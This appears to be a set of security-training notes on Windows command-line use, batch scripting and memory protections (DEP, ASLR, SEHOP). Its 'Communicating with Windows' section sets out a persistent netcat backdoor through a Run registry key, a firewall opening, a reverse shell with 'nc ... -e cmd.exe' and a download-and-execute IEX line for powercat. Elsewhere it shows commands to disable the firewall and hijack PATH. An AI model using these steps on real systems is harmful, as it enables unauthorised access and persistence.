# Introduction to Windows

## Table of Contents
1. Windows Basics
2. Additional Windows Tools
3. Windows Command Prompt
4. Windows Powershell
5. Registry
6. Communicating with Windows
7. Windows Protection Mechanisms


### Introduction to Windows

### 3. Windows Command Prompt
The Windows command prompt is normally invoked with certain credentials, we can initialize it as a normal user first (that is ourselves). Simply hit <kbd>Windows + R</kbd> and type `cmd` and press Enter to launch the command prompt.

An equivalent to `man [command]` in Linux would be `[command] /?`, which will prove useful if you are stuck with any command. Note that `/?` is considered a "switch" (basically options).

Another note is the Absolute pathname difference:
```bat
Format: [Drive]:\[Path]\[File].[Extension]
Example: C:\Program Files\Java\jdk1.8.0_01\bin\javac.exe
```

Some useful commands for Windows Command Prompt are as follows:

Directory/File-related commands
```bat
dir /Q /P
- display contents of directory with file owner, paginated

cd [DIRECTORY]
- change to specified directory

xcopy D:\Data Z:\Backup /E /G /H
- Copies encrypted files, all subdirectories and hidden/system files from source to destination (basically backup)

dir C:\ /s /b | find "SECRET"
- Search local hard drive C:\ for text "SECRET"

findstr /S /I confidential *.*
- Search for all files in subdirectories etc. for the word confidential, non-case sensitive
```

Windows Services / Tasks
```bat
sc start [SERVICE] - start a specific Windows Service
sc stop [SERVICE] - stop a specfic Windows Service
tasklist /svc - List all processes, their PIDs and corresponding Windows Services (if any)
taskkill /pid - Kill a process with a specific PID
```

net/netsh command
```bat
net accounts
- Display local user account policies for passwords (e.g. reset every 30 days etc.)

netsh firewall set opmode disable
- Quickly disable built-in Windows Firewall
```

reg command (For editing registry key/values)
```bat
reg add [\\TargetIPAddr\][RegDomain]\[Key]
- Add new [Key] to [RegDomain] at specified IP address. Assume local machine if no remote machine is specified

reg export [RegDomain]\[Key] [FILE]
- Export all keys in [RegDomain] to [File]

reg import [RegDomain]\[Key] [FILE]
- Import all keys from [FILE] to [RegDomain]

reg query [\\TargetIPAddr\][RegDomain]\[Key] /v [VALUENAME]
- Query a machine and get VALUENAME of a specific key
```

Windows Management Interface Command line (wmic)
```bat
FORMAT: wmic [alias] [where clause] [verb clause]

wmic process list full
- Displays all information about every single process, including the full path of the executable running. Switch 'full' to 'brief' for lesser details.

wmic startup where name='nc.exe'
- Displays a list of startup processes, useful for finding malware / programs that run on startup. In this case, we try to check if nc.exe is launched at startup.

wmic useraccount list full
- Displays a full list of accounts on the local machine, including whether they have passwords set or not etc. (Useful to determine what accounts we can try to compromise)

wmic qfe list full
- Displays a full list of patches and service packs installed on a service machine (Useful to determine if an exploit works) [qfe = Quick Fix Engineering]
```

Invoking Useful GUIs using command line:
```bat
lusrmgr.msc - Local User Manager
services.msc - Services Control Panel
secpol.msc - Security Policy Manager
eventvwr.msc - Event Viewer
regedit - Registry Editor
```

Other Similar commands to Linux
```bat
whoami / echo %username%
- shows login name of currently logged in user

netstat -a -n 2
- Displays all connections and listening ports (in decimal form), auto-refresh every 2 seconds
```

Runnning as another user (similar to sudo)
```bat
runas /user:administrator regedit (will ask for password)
- Run as administartor for a given program (e.g. regedit)
```

In Windows we follow the PATH environment variable in order to deduce where executables can be found. To view your PATH, simply type `path`. However, if you wish to insert your own malicious directory as the directory to be search first permanently, you may use:
```
setx path "C:\BAD_STUFF\;%path%"
```
This will lead to C:\BAD_STUFF being search for first instead of %path%. Note that it also works without `setx` but in that case it only works for the current session.




We can also write a basic batch files using the .bat extension:
```bat
SET name=Bob The Builder &:: This is an appended comment
SET /P filename=Enter a file name: &:: How to do input
IF EXIST %filename% (
	DEL /p %filename% &:: Deletes file after prompting user
) ELSE (
	ECHO %filename% does not exist!
)
GOTO loopyloop
:: Single-line comment, will be skipped! Note: GOTO can be used as loops!
:loopyloop
FOR %%F IN (*.txt) DO echo %%F &:: Display all .txt file names

CALL :add 10 11 &:: Perform a function call with param1=10 and param2=11
ECHO %RESULT% &:: should echo 21

:add
SETLOCAL # Ensure all set only applies for local context
set retval=0
set a=%1 # %1 stands for first argument, %2 for second ...
set b=%2
set /A "retval=a+b" &:: Use /A to perform arithmetic
ENDLOCAL & SET result=%retval% &:: Set result to return value
```

Again, this is just a very small program and there are many other methods / functions out there. You may refer to [this link](https://en.wikibooks.org/wiki/Windows_Batch_Scripting) For more details


### 4. Windows Powershell


### 6. Communicating with Windows
Very often, it is highly annoying to communicate with Windows on remote systems. One possible alternative is to try installing `netcat` and establishing a reverse (TCP) shell. That is, if we are targetting the windows system, we want it to connect back to us:
```
Reverse Shell (What we want):

		-------  WIN connect to YOU -----------
		| YOU |  <----------------- | WINDOWS |
		-------		     		    -----------

Bind Shell (The other kind):

		-------  YOU connect to WIN -----------
		| YOU |  -----------------> | WINDOWS |
		-------		     		    -----------
```

For this section, we assume you can obtain a shell / command prompt equivalent connection from your system to the Windows remote system. This can be potentially achieved using the Meterpreter tool as outlined [here](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/).

We first need to upload the [Windows netcat](https://eternallybored.org/misc/netcat/).
```
upload /path/to/nc.exe C:\Windows\System32
```
This places nc.exe at the location `C:\Windows\System32\nc.exe`.

If we want a persistent connection, we can add netcat as a startup program by modifying the Windows registry (assume using port 9191):
```bat
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\\windows\\system32\\nc.exe -Ldp 9191 -e cmd.exe'

(Check that the key "nc" really has data we want)
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
```

Next, we need to open a port on Windows Firewall for us to run `nc`:
```
netsh firewall add portopening TCP 9191 "NET CAT IS GOOD CAT" ENABLE ALL
```

We also make sure netcat locally on our (Linux) machine listens to an incoming connection (e.g. port 9191):
```
nc -l -p 9191
```
Finally, we can execute netcat on Windows which gives us a command prompt (Supposed your IP address is 123.45.67.89:
```
nc 123.45.67.89 9191 -e cmd.exe
```

If you prefer alternatives, you can use [powercat](https://github.com/besimorhino/powercat), which is essentially a Powershell version of netcat. To install it in Windows:
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

Instead, of netcat, you kind now connect back to the same listening `nc` instance on your (Linux) machine:
```
powershell -c 123.45.67.89 -p 9191 -ep
```
Note: use `-ep` for powershell, `-e cmd` for command prompt

Under very obscure situations, you may consider trying telnet despite the need for administrator privileges. To enable it on newer systems (e.g. Windows 10):
```bat
dism /online /Enable-Feature /FeatureName:TelnetClient
```

For your (Linux) machine (IP 123.45.67.89) that is listening (assume we want to execute `ls` command):
```bash
ls | nc -l -p 12345
```

And for the Windows machine (Asssume port 9191):
```bat
telnet 123.45.67.89 9191
```


### 7. Windows Protection Mechanisms
Due to how common buffer overflow attacks might come to one's mind, Microsoft has built in some mitatigation techniques into Windows that help protect memory manipulation by adversaries.

<u>Data Execution Prevention (DEP)</u>
Typically, an attacker might attempt to store malicious code in an area of memory not intended for it. Attackers then subsequently modify the eip of a program vulnerable to buffer overflow to point to the malicious code:
```
		  Some  Memory         Program Execution Stack
          ------------              ------------
0xBABEBABE| BAD CODE |              |   ....   |
          ------------              ------------
             ......          eip -> |0xBABEBABE|
		  ------------              ------------
0xBABEBEEF| BAD CODE |              |   ....   |
		  ------------              ------------
```
DEP simply marks these regions of memory as non-executable. Therefore, even if `BAD CODE` exists, it cannot be executed, nullifying the damage caused by a buffer overflow.

<u>Address Space Layout Randomization (ASLR)</u>
Traditionally, core processes are assigned to predictable memory regions upon system startup. This implies that an attacker can targe specific core processes as and when they are vulnerable.

```
      Target Program Stack           After ASLR
          ------------              ------------
0x12345678|   VULN   |        0x??? |   ....   |
          ------------              ------------
             ......                 |   ....   |
		  ------------              ------------
0x12ABCDEF|   VULN   |        0x??? |   ....   |
		  ------------              ------------
```
In the above example, we could hypothetically modify bytes located from 0x12345678 to 0x123ABCDEF in some manner that grants code execution to the attacker since we known its memory.

However, ASLR will just randomize all these memory locations, making it difficult for an attacker to guess the location of a given targeted process. Therefore, arbitrary code execution becomes less reliable for an adversary.

<u>Structured Exception Handler Overwrite Protection (SEHOP)</u>
Exceptions are anomalous conditions requiring special processing that disrupts program flow execution. In Windows, a dispatcher is responsible for exceptions, and stores them in a linked list of exception registration records:

```c++
typedef struct _EXCEPTION_REGISTRATION_RECORD {
   struct _EXCEPTION_REGISTRATION_RECORD *Next;
   PEXCEPTION_ROUTINE                     Handler;
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;

```

By corrupting the `Next` Pointer or the `Handler` routine, we are able to execute code that should not be executed by simply raising an exception (e.g. overwrite return address on the stack).

```
      -------   Next   -------    Next     -------  
	  | EX1 |  ----->  | EX2 | -----XXXXX> | EX3 |
	  -------		   -------     |       -------
                                   |
	  Change Next Pointer of EX2   |       -------
	  to point to BADEX instead	   |------>|BADEX|
								           -------
```

Many other mitigation techniques (e.g. [Heap Protection](https://blogs.technet.microsoft.com/srd/2009/08/04/preventing-the-exploitation-of-user-mode-heap-corruption-vulnerabilities/)) has also been implemented. Do feel free to find out more (Microsoft technet isn't a bad place to start)

## The End

Thanks for reading through this whole document! :)
